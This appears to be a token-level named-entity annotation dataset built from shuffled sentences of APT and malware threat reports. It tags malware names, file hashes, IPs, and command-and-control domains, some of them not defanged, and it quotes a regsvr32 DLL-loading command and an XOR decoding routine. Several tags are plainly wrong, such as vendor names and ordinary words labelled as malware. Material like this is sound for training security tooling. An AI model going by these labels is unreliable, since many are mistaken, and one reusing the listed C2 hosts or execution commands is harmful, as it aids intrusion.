61850	O
payload	O
parses	O
data	O
received	O
in	O
response	O
to	O
these	O
requests	O
,	O
searching	O
for	O
variables	O
that	O
contain	O
following	O
combinations	O
of	O
strings	O
:	O

This	O
spear	O
phish	B-malware.infosteal
contained	O
a	O
malicious	O
Word	O
document	O
that	O
exploited	O
CVE-2012-0158	B-malware.backdoor
.	O

Its	O
behavior	O
is	O
very	O
similar	O
to	O
the	O
versions	O
detected	O
in	O
attacks	O
associated	O
with	O
the	O
Iron	O
Tiger	O
APT	O
group	O
.	O

kb681234.exe	O

Should	O
an	O
installed	O
product	O
be	O
found	O
,	O
it	O
will	O
be	O
compared	O
to	O
a	O
predetermined	O
list	O
of	O
product	O
names	O
.	O

Decoy	O
Document	O
Title	O
:	O

It	O
does	O
not	O
take	O
long	O
to	O
come	O
across	O
the	O
following	O
routine	O
,	O
which	O
we	O
will	O
label	O
ComputeKeySuffix_sub_48F52C	O
(	O
)	O
:	O

Following	O
big	O
announcements	O
and	O
public	O
exposures	O
of	O
targeted	O
attack	O
operations	O
,	O
APT	O
groups	O
behave	O
in	O
a	O
predictable	O
manner	O
.	O

공격자는	O
공격	O
대상인	O
기관	O
또는	O
기업에서	O
사용하는	O
중앙관리	O
솔루션을	O
파악한	O
후	O
이를	O
분석하여	O
취약점을	O
찾아	O
공격에	O
이용한다	O
.	O

SWIFT	O
network	O
also	O
generates	O
confirmation	O
messages	O
,	O
and	O
these	O
messages	O
are	O
sent	O
by	O
the	O
software	O
for	O
printing	O
.	O

Author	O
:	O

Table	O
A-4	O
:	O
The	O
listed	O
process	O
names	O
are	O
running	O
.	O

hxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspx	B-url.unknown

This	O
allows	O
the	O
client	O
to	O
specify	O
which	O
specific	O
tunnel	O
data	O
is	O
transmitted	O
to	O
as	O
well	O
as	O
telling	O
the	O
client	O
which	O
tunnel	O
is	O
returning	O
data	O
.	O

hosted	O
a	O
malware	O
file	O
called	O
program_stream_film_for_watch.exe	B-malware.unknown
.	O

The	O
DDE	O
object	O
simply	O
executes	O
Microsoft	O
calc	O
in	O
the	O
detected	O
sample	O
.	O

2016	O
.	O

<	O
>	O
30	O
.	O

We	O
identified	O
a	O
MacOS	O
backdoor	O
(	O
detected	O
by	O
Trend	O
Micro	O
as	O
OSX_OCEANLOTUS.D	O
)	O
that	O
we	O
believe	O
is	O
the	O
latest	O
version	O
of	O
a	O
threat	O
used	O
by	O
OceanLotus	O
(	O
a.k.a.	O
APT	O
32	O
,	O
APT-C-00	O
,	O
SeaLotus	O
,	O
and	O
Cobalt	O
Kitty	O
)	O
.	O

Be	O
sure	O
to	O
put	O
a	O
valid	O
SID	O
in	O
before	O
implementing	O
and	O
test	O
the	O
signature	O
for	O
performance	O
.	O

Besides	O
being	O
encrypted	O
,	O
this	O
protocol	O
is	O
somewhat	O
unusual	O
in	O
that	O
the	O
C	O
&	O
C	O
sends	O
the	O
first	O
payload	O
;	O
it	O
is	O
much	O
more	O
common	O
for	O
the	O
bot	O
to	O
send	O
the	O
first	O
payload	O
.	O

Once	O
a	O
user	O
has	O
lost	O
physical	O
access	O
to	O
their	O
phone	O
,	O
it	O
's	O
really	O
a	O
case	O
of	O
the	O
attacker	O
having	O
a	O
much	O
easier	O
playing	O
field	O
for	O
malicious	O
activity	O
.	O

Of	O
note	O
,	O
these	O
phishing	O
emails	O
were	O
sent	O
to	O
users	O
at	O
two	O
separate	B-malware.backdoor
and	O
unrelated	O
organizations	O
.	O

The	O
first	O
place	O
from	O
where	O
the	O
executable	O
looks	O
to	O
load	O
the	O
DLL	O
is	O
its	O
own	O
directory	O
.	O

It	O
appear	O
as	O
if	O
downloading	O
the	O
module	O
requires	O
manual	O
approval	O
,	O
indicating	O
the	O
need	O
for	O
a	O
human	O
analyst	O
or	O
handler	O
in	O
the	O
loop	O
.	O

Here	O
is	O
the	O
PDB	O
of	O
the	O
sample	O
:	O

Here	O
,	O
the	O
cipher	O
uses	O
a	O
modolo	O
pointer	O
arithmetic	O
along	O
with	O
a	O
decryption	O
key	O
per	O
blob	O
.	O

The	O
Fidelis	O
team	O
updated	O
Fidelis	O
XPS	O
advanced	O
threat	O
defense	O
system	O
with	O
additional	O
rules	O
to	O
reflect	O
current	O
analysis	O
findings	O
associated	O
with	O
this	O
malware	O
.	O

Over	O
80	O
payloads	O
and	O
numerous	O
domains	O
were	O
observed	O
in	O
this	O
operation	O
–	O
all	O
of	O
which	O
were	O
undetected	O
by	O
traditional	O
security	O
products	O
deployed	O
in	O
the	O
company	O
's	O
environment	O
at	O
the	O
time	O
of	O
the	O
attack	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
Unrecom	B-malware.backdoor
RAT	B-malware.backdoor
v.2.0	O
(	O
Version	O
in	O
Spanish	O
)	O
:	O
Over	O
time	O
,	O
various	O
reports	O
in	O
the	O
community	O
have	O
documented	O
the	O
evolution	O
of	O
this	O
tool	O
.	O

Once	O
a	O
system	O
has	O
been	O
compromised	O
,	O
the	O
attacker	O
may	O
install	O
one	O
or	O
more	O
backdoors	O
.	O

We	O
did	O
a	O
quick	O
analysis	O
of	O
the	O
malware	O
and	O
it	O
immediately	O
stood	O
out	O
because	O
of	O
certain	O
unusual	O
things	O
that	O
are	O
not	O
very	O
common	O
in	O
the	O
APT	O
world	O
.	O

The	O
third	O
hash	O
(	O
93ebc337c5fe4794d33df155986a284d	B-hash
)	O
is	O
a	O
DroidJack	B-malware.backdoor
,	O
a	O
malicious	O
attacking	O
platform	O
,	O
targeting	O
android	O
smartphones	O
.	O

Invalid	O
digital	O
signature	O
on	O
malware	O
samples	O

This	O
function	O
is	O
the	O
entry	O
point	O
of	O
the	O
service	O
.	O

The	O
startup	O
routine	O
of	O
the	O
Babar	O
implant	O
will	O
create	O
a	O
registry	O
key	O
under	O
'	O
[	O
HKU	O
]	O
\..\CurrentVersion\Run	O
'	O
to	O
assure	O
persistence	O
.	O

The	O
domain	O
is	O
resolved	O
in	O
the	O
IP	O
'	O
191.101.31.250	B-ip.unknown
'	O
which	O
is	O
located	O
in	O
Holland	O
:	O

In	O
May	O
2018	O
,	O
we	O
found	O
a	O
new	O
sample	O
(	O
Detected	O
as	O
W2KM_DLOADR.UHAOEEN	O
)	O
that	O
may	O
be	O
related	O
to	O
this	O
campaign	O
.	O

*	O

9	O

Below	O
screen	O
shots	O
show	O
the	O
registry	O
entry	O
added	O
by	O
the	O
malware	O
.	O

Fig	O
9	O
.	O

At	O
the	O
very	O
bottom	O
of	O
the	O
page	O
,	O
there	O
are	O
a	O
couple	O
of	O
links	O
to	O
the	O
poisoned	O
installers	O
:	O
hxxp://www.true-crypt[.]com/download/TrueCrypt-Setup-7.1a.exe	O
hxxp://true-crypt[.]com/files/TrueCrypt-7.2.exe	O
Referrers	O
include	O
these	O
localized	O
software	O
aggregates	O
and	O
sharers	O
:	O
gezginler[.]net/indir/truecrypt.html	B-url.normal
tamindir[.]com/truecrypt/indir	B-url.normal
It	O
's	O
interesting	O
that	O
Ksn	O
recorded	O
appearance	O
of	O
the	O
the	O
file	O
on	O
two	O
unique	O
systems	O
in	O
December	O
2015	O
,	O
a	O
third	O
in	O
January	O
2016	O
,	O
all	O
in	O
Turkey	O
,	O
and	O
then	O
nothing	O
until	O
May	O
2016	O
.	O

Upon	O
deobfuscating	O
the	O
payloads	O
,	O
we	O
found	O
32-bit	O
DLLs	O
built	O
in	O
part	O
on	O
the	O
Destover	B-malware.backdoor
malware	O
(	O
Intel	O
Card	O
)	O
code	O
.	O

APT28	B-malware.infosteal
uses	O
stolen	O
credentials	O
to	O
access	O
mailbox	O
and	O
read	O
email	O
.	O

techto-earth[.]com	B-url.cncsvr
domain	O
now	O
resolved	O
to	O
the	O
IP	O
address	O
81.4.125.90	B-ip.unknown
,	O
similarly	O
belonging	O
to	O
the	O
Dutch	O
provider	O
RouteLabel	O
.	O

Two	O
of	O
them	O
appear	O
to	O
test	O
the	O
functionality	O
of	O
the	O
device	O
,	O
one	O
steals	O
SMS	O
message	O
contents	O
,	O
and	O
the	O
remaining	O
two	O
report	O
the	O
location	O
of	O
the	O
device	O
and	O
can	O
exfiltrate	O
various	O
data	O
.	O

Follow	O
us	O

Hence	O
,	O
ramFS	O
serves	O
as	O
a	O
protected	O
container	O
for	O
files	O
to	O
be	O
executed	O
on	O
the	O
machine	O
,	O
offering	O
a	O
disposable	O
execution	O
environment	O
to	O
the	O
operators	O
and	O
leaving	O
very	O
few	O
traces	O
on	O
the	O
system	O
.	O

Figure	O
5	O
:	O
C	O
&	O
C	O
Commands	O
What	O
is	O
interesting	O
is	O
that	O
each	O
key	O
in	O
this	O
configuration	O
file	O
represents	O
a	O
different	O
module	O
in	O
the	O
executable	O
,	O
and	O
when	O
the	O
key	O
is	O
marked	O
as	O
true	O
the	O
executable	O
will	O
run	O
the	O
relevant	O
module	O
's	O
content	O
.	O

Word	O
document	O
contained	O
in	O
EXE	O
file	O
FC17F3B2E2C7F5F24D35899D95B8C4A6	B-hash

The	O
targeted	O
group	O
were	O
members	O
of	O
the	O
Syrian	O
opposition	O
in	O
a	O
private	O
social	O
media	O
group	O
.	O

2.2.2	O
.	O

This	O
decodes	O
to	O
:	O

Last	O
Seen	O

The	O
same	O
three	O
sites	O
targeted	O
with	O
the	O
0-day	O
used	O
in	O
the	O
Forbes	O
attack	O
were	O
also	O
observed	O
distributing	O
malware	O
via	O
googlecaches[.]com	B-url.unknown
-	O
we	O
therefore	O
believe	O
it	O
's	O
likely	O
that	O
the	O
group	O
we	O
previously	O
described	O
as	O
'	O
Cluster	O
1	O
'	O
was	O
behind	O
the	O
Forbes	O
compromise	O
.	O

The	O
malware	O
calls	O
ZwQuerySystemInformation	O
to	O
get	O
ProcessInformation	O
and	O
ModuleInformation	O
.	O

The	O
SWF	O
stages	O
log	O
data	O
to	O
the	O
URL	O
identified	O
as	O
'	O
stabUrl	O
'	O
,	O
which	O
is	O
on	O
the	O
same	O
command-and-control	O
server	O
.	O

Blog	O
français	O
de	O
Kaspersky	O
Lab	O
:	O
http://blog.kaspersky.fr/	B-url.normal

It	O
then	O
appends	O
a	O
key	O
and	O
a	O
DATA_TOKEN	O
xor-ed	O

We	O
have	O
found	O
what	O
may	O
be	O
an	O
early	O
data-gathering	O
stage	O
for	O
future	O
possible	O
heists	O
from	O
financial	O
organizations	O
in	O
Turkey	O
(	O
and	O
possibly	O
other	O
countries	O
)	O
.	O

Emails	O
published	O
by	O
Kazaword	O
and	O
analyzed	O
by	O
Mediapart	O
allege	O
that	O
Arcanum	O
employed	O
Bernard	O
Squarcini	O
,	O
head	O
of	O
France	O
's	O
domestic	O
intelligence	O
agency	O
,	O
the	O
Direction	O
centrale	O
du	O
renseignement	O
intérieur	O
(	O
DCRI	O
)	O
from	O
2007	O
to	O
2012	O
,	O
to	O
inform	O
the	O
Kazakh	O
authorities	O
of	O
the	O
progress	O
of	O
the	O
legal	O
proceedings	O
against	O
Ablyazov	O
and	O
to	O
lobby	O
certain	O
figures	O
in	O
France	O
.	O

To	O
achieve	O
this	O
it	O
spawns	O
a	O
dedicated	O
process	O
with	O
the	O
command	O
line	O
'	O
'	O
regsvr32.exe	O
'	O
/s	O
/n	O
/i	O
'	O
%	O
APPDATA	O
%	O
\	O
%	O
DLLNAME	O
%	O
'	O
'	O
.	O

We	O
provide	O
strategic	O
consulting	O
,	O
threat	O
intelligence	O
,	O
solutions	O
and	O
services	O
–	O
all	O
in	O
the	O
cyber	O
domain	O
.	O

Optionally	O
the	O
user	O
can	O
just	O
hit	O
'	O
cancel	O
'	O
to	O
use	O
the	O
currently	O
logged	O
on	O
USER	O
's	O
authentication	O
token	O
.	O

This	O
request	O
has	O
the	O
following	O
HTTP	O
body	O
:	O

Rifdoor는	B-malware.backdoor
PDB에	O
'	O
E	O
:	O
\Data\My	O
Projects\Troy	O
Source	O
Code\tcp1st\rifle\Release\rifle.pdb'라는	O
문자열을	O
포	O
함하고	O
있는	O
특징을	O
보인다	O
.	O

Exactly	O
64	O
bytes	O
transmitted	O
Detecting	O
Derusbi	B-malware.backdoor
server	O
variants	O
on	O
disk	O
is	O
possible	O
using	O
the	O
following	O
YARA	O
signature	O
:	O

However	O
,	O
the	O
attackers	O
that	O
represent	O
the	O
threat	O
will	O
not	O
be	O
deterred	O
,	O
and	O
variants	O
of	O
the	O
attack	O
are	O
nearly	O
assured	O
.	O

The	O
victim	O
is	O
likely	O
to	O
uninstall	O
the	O
application	O
at	O
this	O
point	O
.	O

16bXkdeQ15nXldeq	O
16bXkdeQ15k=	O
15TXldeT16LXldeq	O

C1EC435E97A4A4C5585392D738B5879F	B-hash
monagameel.chickenkiller.com	B-url.cncsvr

또한	O
주기적인	O
로그	O
확인	O
을	O
통해	O
비정상적인	O
파일이	O
관리	O
서버를	O
통해	O
배포되지	O
않았는지	O
확인해야	O
한다	O
.	O

Malicious	O
URLs	O
related	O
to	O
this	O
malware	O
are	O
also	O
blocked	O
by	O
FortiGuard	O
Web	O
Filtering	O
Service	O
.	O

Operation	O
BugDrop	O
uses	O
a	O
free	O
web	O
hosting	O
site	O
to	O
store	O
the	O
core	O
malware	O
module	O
that	O
gets	O
downloaded	O
to	O
infected	O
victims	O
.	O

Outside	O
of	O
the	O
May	O
WannaCry	B-malware.ransom
attack	O
,	O
the	O
majority	O
of	O
North	O
Korean	O
cryptocurrency	O
operations	O
have	O
targeted	O
South	O
Korean	O
users	O
and	O
exchanges	O
,	O
but	O
we	O
expect	O
this	O
trend	O
to	O
change	O
in	O
2018	O
.	O

Below	O
is	O
a	O
table	O
that	O
shows	O
the	O
mathematical	O
logic	O
in	O
how	O
the	O
above	O
is	O
decoded	O
into	O
the	O
actual	O
C2	O
domain	O
:	O
Obfuscated	O
String	O
1st	O
XOR	O
Key	O
Result	O
2nd	O
XOR	O
Key	O
C2	O
Hex	O
C2	O
ASCII	O
0x70	O
0x79	O
And	O
this	O
is	O
the	O
portion	O
of	O
the	O
code	O
responsible	O
for	O
this	O
process	O
:	O
Figure	O
11	O
-	O
Assembly	O
Code	O
Instructions	O
for	O
the	O
Double	O
XOR	O
Routine	O
Next	O
,	O
the	O
malware	O
implant	O
uses	O
more	O
than	O
one	O
layer	O
to	O
obfuscate	O
its	O
network	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
communications	O
.	O

Figure	O
5	O
depicts	O
an	O
HTTP	O
GET	O
request	O
generated	O
by	O
the	O
payload	O
,	O
with	O
minimal	O
HTTP	O
headers	O
.	O

Hardcoded	O
RSA256	O
key	O
showing	O
the	O
first	O
20	O
characters	O

Little	O
information	O
is	O
available	O
at	O
present	O
about	O
when	O
or	O
how	O
the	O
attackers	O
compromised	O
the	O
bank	O
,	O
but	O
it	O
is	O
likely	O
more	O
details	O
will	O
emerge	O
in	O
the	O
coming	O
weeks	O
.	O

Perhaps	O
the	O
most	O
interesting	O
of	O
these	O
,	O
and	O
the	O
one	O
we	O
've	O
chosen	O
to	O
key	O
on	O
from	O
a	O
detection	O
perspective	O
,	O
is	O
the	O
following	O
bit	O
of	O
assembly	O
which	O
was	O
the	O
final	O
component	O
in	O
decoding	O
a	O
large	O
encoded	O
block	O
of	O
code	O
:	O
lea	O
edx	O
,	O
[	O
esi+edi	O
]	O
mov	O
edi	O
,	O
[	O
ebp+var_4	O
]	O
mov	O
cl	O
,	O
[	O
ecx+edx	O
]	O
xor	O
cl	O
,	O
[	O
eax+edi	O
]	O
inc	O
eax	O
mov	O
edi	O
,	O
[	O
ebp+arg_8	O
]	O
mov	O
[	O
edx	O
]	O
,	O
cl	O
mov	O
ecx	O
,	O
[	O
ebp+arg_0	O
]	O
cmp	O
eax	O
,	O
ebx	O
This	O
snippet	O
in	O
the	O
analyzed	O
samples	O
used	O
a	O
fixed	O
size	O
XOR	O
key	O
usually	O
0x66	O
bytes	O
long	O
but	O
would	O
sequentially	O
XOR	O
every	O
byte	O
by	O
each	O
value	O
of	O
the	O
key	O
.	O

The	O
initial	O
installers	O
of	O
this	O
campaign	O
were	O
discovered	O
due	O
to	O
behavior	O
similarities	O
with	O
previous	O
Hangover-related	O
malware	O
.	O

Upon	O
execution	O
these	O
files	O
install	O
a	O
multi-featured	O
trojan	O
on	O
the	O
victim	O
's	O
computer	O
.	O

In	O
this	O
campaign	O
,	O
contact	O
with	O
targets	O
was	O
initiated	O
through	O
phishing	O
e-mails	O
,	O
chat	O
messages	O
and	O
Facebook	O
posts	O
.	O

26	O
,	O
2018	O
)	O
used	O
a	O
macro-based	O
document	O
that	O
dropped	O
a	O
VBS	O
file	O
and	O
an	O
INI	O
file	O
.	O

The	O
set	O
of	O
Trojans	B-malware.backdoor
is	O
powerful	O
,	O
with	O
keyboard	O
recording	O
,	O
voice	O
recording	O
,	O
screen	O
capture	O
,	O
file	O
capture	O
and	O
U	O
disk	O
operation	O
functions	O
,	O
etc	O
.	O

MD5	O
b3e1c2e40be54fbc0f7921ea8ce807e2	B-hash
SHA1	O
3f6436420e84ac96d9a3c93045c07cdadda8ec81	B-hash
SHA256	O
3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d	B-hash
MD5	O
8eda7dfa4ec4ac975bb12d2a3186bbeb	B-hash
SHA1	O
b5c49bbbf7499a30110adc94480b3edbc8d6e92b	B-hash
SHA256	O
829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0	B-hash
It	O
failed	O
to	O
execute	O
with	O
.NET	O
4.0	O
on	O
Windows	O
XP	O
.	O

This	O
third	O
element	O
is	O
XOR	O
ed	O
against	O
the	O
current	O
(	O
k	O

rastlsc.exe	O
(	O
SHA1	O
:	O
2616da1697f7c764ee7fb558887a6a3279861fac	B-hash
,	O
copy	O
of	O
legitimate	O
Symantec	O
Network	O
Access	O
Control	O
application	O
,	O
dot1xtra.exe	O
)	O

1st	O
Portuguese­speaking	O
group	O
#	O
ThePoseidonAPT	B-malware.infosteal
attacks	O
companies	O
globally	O
#	O
TheSAS2016	O
Our	O
research	O
team	O
was	O
able	O
to	O
put	O
together	O
the	O
disparate	O
pieces	O
of	O
this	O
puzzle	O
by	O
diligently	O
tracing	O
the	O
evolution	O
of	O
Poseidon	B-malware.infosteal
's	O
toolkit	O
in	O
pursuit	O
of	O
an	O
overarching	O
understanding	O
of	O
how	O
the	O
actor	O
thinks	O
and	O
the	O
specific	O
practices	O
involved	O
in	O
infecting	O
and	O
extorting	O
its	O
victims	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O
The	O
'	O
Invitation.jar	B-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
magnumbiz.no-ip[.]biz	B-malware.infosteal
'	O
over	O
port	O
'	O
1505	O
'	O
.	O

Once	O
matched	O
,	O
it	O
will	O
automatically	O
replace	O
it	O
with	O
the	O
attacker	O
's	O
wallet	O
address	O
so	O
the	O
victim	O
would	O
unknowingly	O
transfer	O
money	O
to	O
the	O
attacker	O
's	O
account	O
:	O

We	O
'd	O
previously	O
missed	O
the	O
link	O
between	O
Cluster	O
4	O
–	O
and	O
malware	O
widely	O
known	O
as	O
'	O
EvilGrab	B-malware.infosteal
'	O
or	O
'	O
Vidgrab	B-malware.backdoor
'	O
.	O

This	O
includes	O
following	O
links	O
sent	O
in	O
email	O
.	O

ZxShell	B-malware.backdoor
employs	O
a	O
strange	O
method	O
for	O
communication	O
:	O
it	O
hooks	O
the	O
NtWriteFile	O
API	O
and	O
recognizes	O
5	O
different	O
special	O
handle	O
values	O
as	O
commands	O
:	O
0x111111111	O
--	O
Hide	O
'	O
Loveusd	O
'	O
driver	O
from	O
the	O
system	O
kernel	O
driver	O
list	O
0x22222222	O
--	O
Securely	O
delete	O
an	O
in-use	O
or	O
no-access	O
target	O
file-name	O
0x44444444	O
--	O
Unhook	O
the	O
ZwWriteFile	O
API	O
and	O
hook	O
KiFastCallEntry	O
0x55555555	O
--	O
Remove	O
the	O
ZxShell	B-malware.backdoor
Image	O
Load	O
Notify	O
routine	O
0x88888888	O
--	O
Set	O
a	O
special	O
value	O
called	O
'	O
type	O
'	O
in	O
Windows	O
registry	O
key	O
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain	O
The	O
second	O
Loveusd	O
system	O
thread	O
does	O
a	O
lot	O
of	O
things	O
.	O

The	O
initial	O
dropper	O
is	O
likely	O
to	O
be	O
packed	O
(	O
UPX	O
,	O
etc	O
)	O
.	O

The	O
CONTEXT	O
structure	O
is	O
shown	O
in	O
the	O
following	O
figure	O
,	O
and	O
the	O
offset	O
of	O
EIP	O
and	O
ESP	O
in	O
CONTEXT	O
can	O
be	O
calculated	O
.	O

Failing	O
this	O
,	O
the	O
determines	O
if	O
the	O
victim	O
's	O
machine	O
is	O
running	O
the	O
360	O
antivirus	O
product	O
by	O
looking	O
for	O
a	O
process	O
with	O
the	O
name	O
ZhuDongFangYu.exe	O
.	O

It	O
is	O
an	O
attempt	O
to	O
trick	O
any	O
users	O
who	O
are	O
using	O
Protected	O
Mode	O
on	O
their	O
systems	O
.	O

APT	B-malware.unknown
CAMPAIGN	I-malware.unknown

Some	O
attacks	O
have	O
focused	O
on	O
the	O
sorts	O
of	O
targets	O
that	O
seem	O
likely	O
to	O
be	O
of	O
interest	O
to	O
Russian	O
intelligence	O
services	O
.	O

Throughout	O
the	O
years	O
,	O
as	O
evidenced	O
in	O
countless	O
media	O
reports	O
,	O
world	O
superpowers	O
have	O
recognized	O
and	O
utilized	O
the	O
Internet	O
as	O
a	O
powerful	O
source	O
for	O
intelligence	O
collection	O
,	O
and	O
on	O
occasion	O
we	O
have	O
been	O
offered	O
glimpses	O
as	O
to	O
how	O
they	O
are	O
leveraging	O
cyber	O
espionage	O
in	O
support	O
of	O
their	O
national	O
diplomatic	O
,	O
military	O
or	O
economic	O
objectives	O
.	O

Exploit	O
Document	O
MD5	O
:	O

In	O
our	O
opinion	O
,	O
the	O
answer	O
would	O
have	O
to	O
be	O
'	O
no	O
'	O
.	O

We	O
believe	O
that	O
this	O
campaign	O
targeted—at	O
least	O
in	O
part—high-profile	O
members	O
of	O
the	O
Syrian	O
opposition	O
.	O

Cyber	O
espionage	O
groups	O
will	O
continue	O
targeting	O
defense	O
sectors	O
and	O
defense	O
equipment	O
manufacturers	O
for	O
the	O
following	O
reasons	O
:	O

The	O
operation	O
seeks	O
to	O
capture	O
a	O
range	O
of	O
sensitive	O
information	O
from	O
its	O
targets	O
including	O
audio	O
recordings	O
of	O
conversations	O
,	O
screen	O
shots	O
,	O
documents	O
and	O
passwords	O
.	O

When	O
the	O
user	O
opens	O
the	O
document	O
,	O
text	O
in	O
Korean	O
tells	O
the	O
victim	O
to	O
enable	O
content	O
to	O
allow	O
the	O
document	O
to	O
be	O
opened	O
in	O
their	O
version	O
of	O
Word	O
.	O

We	O
believe	O
this	O
exfiltration	O
of	O
files	O
to	O
be	O
Dino	B-malware.backdoor
's	O
end	O
goal	O
.	O

Scrambling	O
Class	O
Parser	O
has	O
several	O
methods	O
,	O
one	O
for	O
each	O
variable	O
type	O
–	O
Parser	O
:	O
:inBytes	O
,	O
Parser	O
:	O
:inByte	O
,	O

Here	O
is	O
an	O
overview	O
of	O
this	O
activity	O
:	O
A	O
public	O
blog	O
published	O
by	O
the	O
Electronic	O
Frontier	O
Foundation	O
indicated	O
that	O
journalists	O
,	O
activists	O
,	O
dissidents	O
,	O
and	O
bloggers	O
were	O
targeted	O
in	O
2013	O
by	O
malware	O
and	O
tactics	O
consistent	O
with	O
APT32	B-malware.infosteal
operations	O
.	O

2016	O
.	O

While	O
examining	O
the	O
ATD	O
website	O
,	O
Volexity	B-malware.backdoor
also	O
observed	O
that	O
the	O
site	O
had	O
a	O
password	O
protected	O
backdoor	O
webshell	O
placed	O
on	O
it	O
.	O

The	O
DLL	O
has	O
the	O
following	O
properties	O
:	O
MD5	O
Hash	O
:	O
Compile	O
Time	O
:	O
Export	O
Function	O
:	O
The	O
malware	O
performs	O
the	O
following	O
set	O
of	O
actions	O
:	O
Starts	O
iexplore.exe	O
(	O
Internet	O
Explorer	O
)	O
in	O
a	O
suspended	O
state	O
Injects	O
NavShExt.dll	O
into	O
the	O
iexplore.exe	O
process	O
and	O
calls	O
the	O
DLL	O
export	O
Setting	O
function	O
The	O
iexplore.exe	O
process	O
continues	O
to	O
run	O
in	O
the	O
background	O
Creates	O
a	O
mutex	O
named	O
donotbotherme	O
(	O
see	O
Exhibit	O
3	O
)	O
to	O
avoid	O
having	O
duplicated	O
executions	O
Creates	O
a	O
file	O
named	O
thumbcache_1CD60.db	O
in	O
AppData\Local\Microsoft\Windows\Explorer\	O
where	O
the	O
harvested	O
data	O
is	O
stored	O
Sends	O
data	O
to	O
and	O
downloads	O
files	O
and	O
commands	O
from	O
the	O
designated	O
C2	O
server	O
Harvests	O
extensive	O
system	O
information	O
from	O
the	O
machine	O
,	O
such	O
as	O
the	O
following	O
:	O
LAN	O
and	O
WAN	O
IP	O
addresses	O
(	O
for	O
the	O
latter	O
,	O
it	O
uses	O
the	O
free	O
IP	O
address	O
service	O
ipaddress.com	O
)	O
Installed	O
software	O
list	O
Proxy	O
information	O
Process	O
enumeration	O
via	O
tasklist	O
List	O
of	O
all	O
the	O
files	O
on	O
the	O
user	O
's	O
desktop	O
:	O
Mutex	O
Creation	O
Based	O
on	O
the	O
currently	O
available	O
intelligence	O
we	O
also	O
believe	O
the	O
malware	O
is	O
capable	O
of	O
providing	O
the	O
attacker	O
with	O
a	O
remote	O
shell	O
on	O
the	O
host	O
and	O
can	O
completely	O
uninstall	O
itself	O
.	O

6/10	O

Leverage	O
initial	O
compromise	O
to	O
access	O
other	O
systems	O
and	O
move	O
deeper	O
into	O
the	O
victim	O
network	O
.	O

Romance	O
in	O
cyberespionage	B-malware.backdoor

The	O
DUBNIUM	B-malware.drop
samples	O
are	O
distributed	O
in	O
various	O
ways	O
,	O
one	O
instance	O
was	O
using	O
a	O
zero-day	O
exploit	O
that	O
targets	O
Adobe	O
Flash	O
,	O
in	O
December	O
2015	O
.	O

For	O
example	O
,	O
the	O
submitted	O
netui3.dll	B-malware.backdoor
sample	O
may	O
not	O
match	O
the	O
submitted	O
netsat.exe	B-malware.infosteal
sample	O
in	O
terms	O
of	O
versioning	O
.	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

A	O
host	O
firewall	O
will	O
recognize	O
the	O
outgoing	O
connection	O
as	O
originated	O
by	O
the	O
browser	O
instead	O
of	O
the	O
ZxShell	B-malware.backdoor
service	O
host	O
process	O
.	O

Grammatical	O
mistakes	O
indicate	O
the	O
attackers	O
are	O
not	O
native	O
to	O
both	O
languages	O
:	O
The	O
post	O
linked	O
to	O
a	O
malicious	O
website	O
hosted	O
in	O
yolasite.com	B-url.unknown
(	O
which	O
is	O
a	O
legitimate	O
website	O
building	O
and	O
hosting	O
platform	O
)	O
:	O
yolasite[.]com	B-url.unknown
The	O
button	O
–	O
'	O
another	O
website	O
:	O
ומחשב	O
טלפון	O
להורדה	O
'	O
(	O
literal	O
translation	O
–	O
'	O
To	O
download	O
phone	O
and	O
computer	O
'	O
)	O
linked	O
to	O
a	O
zip	O
file	O
in	O

Figure	O
10	O
.	O

cmd	O
:	O
Executes	O
shell	O
commands	O

Written	O
in	O
Delphi	O
,	O
the	O
code	O
of	O
XtremeRAT	B-malware.backdoor
is	O
shared	O
amongst	O
several	O
other	O
Delphi	O
RAT	O
projects	O
including	O
SpyNet	O
,	O
CyberGate	O
,	O
and	O
Cerberus	O
.	O

Malware	O
analysis	O
by	O
Morgan	O
Marquis-Boire	O
and	O
Bill	O
Marczak	O
.	O

The	O
two	O
files	O
also	O
have	O
an	O
identical	O
compilation	O
time	O
,	O
which	O
suggests	O
the	O
backdoor	O
is	O
probably	O
not	O
recompiled	O
very	O
often	O
and	O
instead	O
the	O
attacker	O
simply	O
updates	O
the	O
callback	O
configuration	O
information	O
.	O

V0.9.6Y­SN1­	O
<	O
hostname	O
>	O
­	O
<	O
IP	O
address	O
>	O
Aug	O
28th	O
2012	O
igfxtray.exe	O
681a014e9d221c1003c54a2a9a1d9df8	B-hash
winsups.dll	O
mqe45tex13fw14op0	O
http.4pu.com:80	B-url.cncsvr
V0.7­SN0­	O
<	O
hostname	O
>	O
h	O
;	O
­	O
<	O
IP	O
address	O
>	O
Aug	O
28th	O
2012	O
6aac76fc8309e29ea8a7afea48ae9b29	B-hash
msdsp.dll	O
654234576804d	O
oracledata.ns01.us:80	B-url.cncsvr
V0.9.6X­SN1­	O
<	O
hostname	O
>	O
­	O
<	O
IP	O
address	O
>	O
Aug	O
12th	O
2012	O
ctfmon.exe	O
d5640ae049779bbb068eff08616adb95	B-hash
winsups.dll	O
mqe45tex13fw14op0	O
mydns.dns2.us:443	B-url.cncsvr
V0.7­SN0­	O
<	O
hostname	O
>	O
­	O
<	O
IP	O
address	O
>	O
Aug	O
2nd	O
2010	O
igfxtray.exe	O
681a014e9d221c1003c54a2a9a1d9df8	B-hash
winsups.dll	O
mqe45tex13fw14op0	O
http.4pu.com:80	B-url.cncsvr
V0.7­SN0­	O
<	O
hostname	O
>	O
­	O
<	O
IP	O
address	O
>	O
Aug	O
2nd	O
2010	O
igfxpers.exe	O

Posted	O
on	O
October	O
9	O
,	O
2014	O
by	O
Steven	O
Adair	O
Over	O
the	O
last	O
few	O
months	O
,	O
Volexity	B-malware.backdoor
has	O
been	O
tracking	O
a	O
particularly	O
remarkable	O
advanced	O
persistent	O
threat	O
(	O
APT	B-malware.unknown
)	O
operation	O
involving	O
strategic	O
web	O
compromises	O
of	O
websites	O
in	O
Hong	O
Kong	O
and	O
Japan	O
.	O

Copying	O
or	O
further	O
distribution	O
beyond	O
the	O
original	O
recipient	O
